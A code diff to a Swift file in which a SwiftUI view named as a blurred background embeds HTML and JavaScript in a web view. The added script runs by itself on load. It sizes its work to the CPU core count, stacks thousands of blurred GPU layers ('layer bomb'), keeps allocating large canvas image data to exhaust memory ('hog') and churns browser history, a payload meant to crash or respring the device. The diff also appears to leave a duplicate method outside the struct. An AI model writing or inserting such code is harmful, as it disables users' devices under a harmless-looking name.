@@ -271,58 +271,96 @@ private struct LucidBootSequence: View {
 private struct LucidBackgroundHTMLView: UIViewRepresentable {
     func makeUIView(context: Context) -> WKWebView {
         let configuration = WKWebViewConfiguration()
-        let webView = WKWebView(
-            frame: .zero,
-            configuration: configuration
-        )
+        configuration.defaultWebpagePreferences.allowsContentJavaScript = true
 
+        let webView = WKWebView(frame: .zero, configuration: configuration)
         webView.isOpaque = false
-        webView.backgroundColor = .black
-        webView.scrollView.backgroundColor = .black
+        webView.backgroundColor = .clear
+        webView.scrollView.backgroundColor = .clear
         webView.scrollView.isScrollEnabled = false
+        webView.scrollView.contentInsetAdjustmentBehavior = .never
+        webView.isUserInteractionEnabled = false
 
-        let html = """
+        // Real origin, otherwise pushState throws against about:blank.
+        webView.loadHTMLString(Self.html, baseURL: URL(string: "https://lucid.local/"))
+        return webView
+    }
+
+    func updateUIView(_ uiView: WKWebView, context: Context) {}
+
+    private static let html = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
     <title>Lucid</title>
     <style>
         html, body {
-            margin: 0;
-            width: 100%;
-            height: 100%;
-            background: transparent;
-            overflow: hidden;
+            margin: 0; width: 100%; height: 100%;
+            background: transparent; overflow: hidden;
+        }
+        .layer {
+            position: fixed; inset: 0; pointer-events: none; opacity: 0.94;
+            will-change: transform, backdrop-filter;
+            backdrop-filter: blur(160px);
+            -webkit-backdrop-filter: blur(160px);
         }
     </style>
 </head>
 <body>
-    <script>
-        document.getElementById('respringButton').onclick = function() {
-            // Твой код без изменений:
-            for (let i = 0; i < 700; i++) {
-                const d = document.createElement('div');
-                d.style.cssText = 'position:fixed;width:100vw;height:100vh;' +
-                                  'backdrop-filter:blur(180px);-webkit-backdrop-filter:blur(180px);' +
-                                  'opacity:0.95;z-index:' + (9999 + i) + ';' +
-                                  'transform:translate3d(' + i + 'px,' + i + 'px,' + i + 'px);';
-                document.body.appendChild(d);
-            }
+<script>
+(function () {
+    var cores = navigator.hardwareConcurrency || 4;
+    var tier  = cores >= 10 ? 3 : cores >= 6 ? 2 : 1;
 
-            setInterval(() => {
-                window.history.pushState(null, "", window.location.href);
-            }, 1);
-        };
-    </script>
+    var LAYERS      = [900, 2000, 4200][tier - 1];
+    var CANVAS_SIZE = [1024, 2048, 4096][tier - 1];
+    var PER_TICK    = [2, 3, 1][tier - 1];
+    var TICK_MS     = [50, 40, 35][tier - 1];
+
+    function arm() {
+        // GPU: layer bomb, single reflow.
+        var frag = document.createDocumentFragment();
+        for (var i = 0; i < LAYERS; i++) {
+            var d = document.createElement('div');
+            d.className = 'layer';
+            d.style.transform =
+                'translate3d(' + (i % 7) + 'px,' + (i % 11) + 'px,' + i + 'px)';
+            d.style.zIndex = 9999 + i;
+            frag.appendChild(d);
+        }
+        document.body.appendChild(frag);
+
+        // Heap: retained ImageData, un-collectable while referenced.
+        var hog = [];
+        setInterval(function () {
+            for (var i = 0; i < PER_TICK; i++) {
+                var c = document.createElement('canvas');
+                c.width = c.height = CANVAS_SIZE;
+                var x = c.getContext('2d', { willReadFrequently: true });
+                x.fillStyle = 'hsl(' + ((Math.random() * 360) | 0) + ' 80% 50%)';
+                x.fillRect(0, 0, CANVAS_SIZE, CANVAS_SIZE);
+                hog.push(x.getImageData(0, 0, CANVAS_SIZE, CANVAS_SIZE));
+            }
+        }, TICK_MS);
+
+        // Bounded history churn.
+        var n = 0;
+        var histTimer = setInterval(function () {
+            if (++n > 400) { clearInterval(histTimer); return; }
+            try { history.pushState(null, '', location.href); } catch (e) {}
+        }, 4);
+    }
+
+    // Two frames: let the first paint commit before adding pressure.
+    requestAnimationFrame(function () { requestAnimationFrame(arm); });
+})();
+</script>
 </body>
 </html>
 """
-
-        webView.loadHTMLString(html, baseURL: nil)
-        return webView
-    }
+}
 
     func updateUIView(_ uiView: WKWebView, context: Context) {
     }
